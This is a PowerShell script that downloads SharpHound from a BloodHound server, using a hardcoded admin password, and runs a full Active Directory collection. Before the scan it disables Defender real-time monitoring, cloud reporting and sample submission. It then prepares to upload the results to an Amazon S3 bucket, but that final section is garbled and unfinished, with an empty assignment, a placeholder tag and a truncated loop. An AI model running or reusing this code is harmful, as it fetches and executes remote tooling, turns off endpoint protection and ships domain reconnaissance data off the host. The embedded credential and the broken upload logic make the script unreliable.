<#
	.SYNOPSIS
	Installs and runs the Sharphound data collector.

	.DESCRIPTION
	Installs the Sharphound data collector from a running Bloodhound instance and runs a scan querying all the domain info and uploads the results to an Amazon S3 Bucket.

	.PARAMETER BloodhoundIP
	Specifies the IP address of the machine running Bloodhound where the API request for downloading Sharphound will be sent.

	.EXAMPLE
	PS> .\sharphound.ps1 -BloodhoundIP 10.10.10.5
#>

param(
	[Parameter(Mandatory=$true)]
	[string] $BloodhoundIP
)


function ManageWindowsProtection
{
	param(
		[Parameter(Mandatory=$false)]
		[switch] $Disable,
		[Parameter(Mandatory=$false)]
		[switch] $Reset
	)
	
	if ($Disable.IsPresent)
	{
		Write-Warning "[*] Disabling Realtime Monitoring..."
		# Disable Realtime Monitoring for threats
		Set-MpPreference -DisableRealtimeMonitoring $true
		Write-Warning "[*] Realtime Monitoring disabled."

		Write-Warning "[*] Disabling MAPSReporting Active Protection..."
		# Specifies the type of membership in the Microsoft Active Protection Service
		# Value = 0 (Disabled)
		Set-MpPreference -MAPSReporting 0
		Write-Warning "[*] MAPSReporting Active Protection disabled."

		Write-Warning "[*] Revoking consent for Sample Submission..."
		# Specifies user consent for sending samples.
		# Value = 2 (Never send)
		Set-MpPreference -SubmitSamplesConsent 2
		Write-Warning "[*] Revoked consent for Sample Submission."

		Write-Warning "[*] Windows Virus and Threat Protection has been disabled temporarily."
		
		return $null
	}
	
	if ($Reset.IsPresent)
	{
		# Reset Windows Virtus and Threat Protection
		Write-Warning "[*] Re-enabling Windows Protection..."

		# Reset Realtime Monitoring for threats
		Write-Warning "[*] Resetting Realtime Monitoring..."
		Set-MpPreference -DisableRealtimeMonitoring $realtimeMonitoringOriginal
		Write-Warning "[*] Realtime Monitoring reset."

		# Specifies the type of membership in the Microsoft Active Protection Service
		Write-Warning "[*] Resetting MAPSReporting Active Protection..."
		Set-MpPreference -MAPSReporting $mapsReportingOriginal
		Write-Warning "[*] MAPSReporting Active Protection reset."

		# Specifies user consent for sending samples.
		Write-Warning "[*] Resetting consent for Sample Submission..."
		Set-MpPreference -SubmitSamplesConsent $submitSamplesConsentOriginal
		Write-Warning "[*] Reset consent for Sample Submission."

		Write-Warning "[*] Windows Virus and Threat Protection has been reset."
		
		return $null
	}

	Write-Error "[!] Ambiguous option. You can only select one of -Disable OR -Reset"
	return $null
}

# Function declarations
function RemoveSharphoundZip
{
	if ((Test-Path -Path $sharphoundZipPath))
	{
		try
		{
			Write-Host "[*] Deleting $sharphoundZipPath..." -ForegroundColor Cyan
			Remove-Item -Path $sharphoundZipPath -Force
			Write-Host "[*] Deleted $sharphoundZipPath." -ForegroundColor Cyan
		} catch
		{
			Write-Error $_.Exception.Message
			exit 1
		}
	}
}

function RemoveSharphoundFolder
{
	if ((Test-Path -Path $sharphoundPath))
	{
		try
		{
			Write-Host "[*] Deleting $sharphoundPath..." -ForegroundColor Cyan
			Remove-Item -Path $sharphoundPath -Force -Recurse
			Write-Host "[*] Deleted $sharphoundPath." -ForegroundColor Cyan
		} catch
		{
			Write-Error $_.Exception.Message
			exit 1
		}
	}
}

function CleanUp
{
	RemoveSharphoundZip
	RemoveSharphoundFolder
}


# Variables
# Progress
$totalScriptTasks = 8
$currentScriptTask = 1

# Paths
$tempPath = "$env:TEMP"
$sharphoundZipPath = "$tempPath\sharphound.zip"
$sharphoundPath = "$tempPath\sharphound"
$sharphoundResultsPath = "$tempPath\SharphoundResults"
$sharphoundExePath = "$sharphoundPath\Sharphound.exe"

# API
$BLOODHOUND_IP = $BloodhoundIP
$BLOODHOUND_PORT = 8080
$BLOODHOUND_BASE_URL = "${BLOODHOUND_IP}:${BLOODHOUND_PORT}"
$SHARPHOUND_DOWNLOAD_ENDPOINT = "/api/v2/collectors/sharphound/latest"

# Login to Bloodhound and get JWT
$BLOODHOUND_LOGIN_ENDPOINT = "/api/v2/login"
$BLOODHOUND_USERNAME = "admin"
$BLOODHOUND_PASSWORD = "gtSS29rPHOG28^meGyqE"
$LOGIN_METHOD = "secret"

$body = @{
	login_method = $LOGIN_METHOD
	secret = $BLOODHOUND_PASSWORD
	username = $BLOODHOUND_USERNAME
}

$jsonBody = $body | ConvertTo-Json

Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Fetching JWT from Bloodhound API..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

try
{
	Write-Host "[*] Fetching JWT..." -ForegroundColor Cyan
	
	$loginResponse = Invoke-RestMethod -Uri "$BLOODHOUND_BASE_URL$BLOODHOUND_LOGIN_ENDPOINT" -Method POST -Body $jsonBody -ContentType "application/json" -ErrorAction Stop

	$JWT = $loginResponse.data.session_token
	
	Write-Host "[*] Fetched JWT..." -ForegroundColor Cyan
} catch
{
	Write-Error "[!] Failed to fetch JWT..."
	Write-Error $_.Exception.Message
	exit 1
}

# Disable Windows Virtus and Threat Protection
Write-Warning "[*] Installing/Running Sharphound requires Windows Protection to be disabled temporarily..."

Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Disabling Windows Protection temporarily..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

# Original values
$realtimeMonitoringOriginal = (Get-MpPreference).DisableRealtimeMonitoring
$mapsReportingOriginal = (Get-MpPreference).MAPSReporting
$submitSamplesConsentOriginal = (Get-MpPreference).SubmitSamplesConsent

ManageWindowsProtection -Disable

# Downloading Sharphound archive from Bloodhound API
$HEADERS = @{
	"Authorization" = "Bearer $JWT"
}

Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Downloading Sharphound archive from Bloodhound API..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

try
{
	Write-Host "[*] Downloading Sharphound..." -ForegroundColor Cyan

	Invoke-RestMethod -Uri "$BLOODHOUND_BASE_URL$SHARPHOUND_DOWNLOAD_ENDPOINT" -Method GET -Headers $HEADERS -Outfile $sharphoundZipPath -ErrorAction Stop

	Write-Host "[*] Downloaded Sharphound into $sharphoundZipPath." -ForegroundColor Cyan
} catch
{
	Write-Error "[!] Download Failed"
	Write-Error $_.Exception.Message
	
	ManageWindowsProtection -Reset
	
	exit 1
}

# Extracting downloaded Sharphound archive
try
{
	Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Extracting Sharphound archive..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
	$currentScriptTask = $currentScriptTask + 1

	Write-Host "[*] Extracting $sharphoundZipPath..." -ForegroundColor Cyan

	Expand-Archive -Path $sharphoundZipPath $sharphoundPath -ErrorAction Stop

	Write-Host "[*] Extracted $sharphoundZipPath into $sharphoundPath." -ForegroundColor Cyan
} catch
{
	Write-Error "[!] Error extrating $sharphoundZipPath"
	Write-Error $_.Exception.Message
	
	RemoveSharphoundZip
	
	ManageWindowsProtection -Reset
	
	exit 1
}

# Create directory for Sharphound results
Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Creating directory for Sharphound results..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

try
{
	Write-Host "[*] Creating Sharphound results directory $sharphoundResultsPath..." -ForegroundColor Cyan
	New-Item -Path $sharphoundResultsPath -ItemType Directory -Force -ErrorAction Stop
	Write-Host "[*] Created Sharphound results directory $sharphoundResultsPath." -ForegroundColor Cyan
} catch
{
	Write-Error "[!] Failed to create directory: '$sharphoundResultsPath'."
	Write-Error $_.Exception.Message
	
	RemoveSharphoundZip
	
	exit 1
}

# Run Sharphound scan
Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Running Sharphound scan..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

try
{
	Write-Host "[*] Running Sharphound..." -ForegroundColor Cyan
	Start-Process -Wait -FilePath $sharphoundExePath -ArgumentList "-c All --OutputDirectory $sharphoundResultsPath" -ErrorAction Stop
	$createdZipFiles = (Get-ChildItem -Path $sharphoundResultsPath -Filter "*_Bloodhound.zip").Name -join ", "
	Write-Host "[*] Sharphound scan is done. The results are contained in the following zip files: $createdZipFiles" -ForegroundColor Cyan
} catch
{
	Write-Error "[!] Error running Sharphound."
	Write-Error $_.Exception.Message
	
	RemoveSharphoundZip
	RemoveSharphoundFolder
	
	ManageWindowsProtection -Reset
	
	exit 1
}

Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Resetting Windows Protection..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

# Reset Windows Protection
ManageWindowsProtection -Reset

# Install required AWS.Tools modules
Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Installing required 'AWS.Tools' PowerShell modules..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

try
{
	Write-Host "[*] Installing 'AWS.Tools.Installer' PowerShell module..." -ForegroundColor Cyan
	Install-Module -Name AWS.Tools.Installer -Force -ErrorAction Stop
	Write-Host "[*] Installed 'AWS.Tools.Installer' PowerShell module." -ForegroundColor Cyan
	
	Write-Host "[*] Installing 'AWS.Tools.S3' PowerShell module..." -ForegroundColor Cyan
	Install-AWSToolsModule AWS.Tools.S3 -CleanUp -Force
	Write-Host "[*] Installed 'AWS.Tools.S3' PowerShell module." -ForegroundColor Cyan
} catch
{
	Write-Error "[!] Failed to install 'AWS.Tools' module."
	Write-Error $_.Exception.Message
	
	RemoveSharphoundZip
	RemoveSharphoundFolder
	
	exit 1
}

# Upload Sharphound scan results to S3 Bucket
$S3_OBJECT_PREFIX = 
Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Uploading Sharphound results to Amazon S3..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
$currentScriptTask = $currentScriptTask + 1

Write-Host "<S3BUCKET></S3BUCKET>"

foreach ($

# Clean up
CleanUp

# Complete the progress bar
Write-Progress -Activity "Sharphound Installation and Scan" -Id 0 -Completed

exit 0
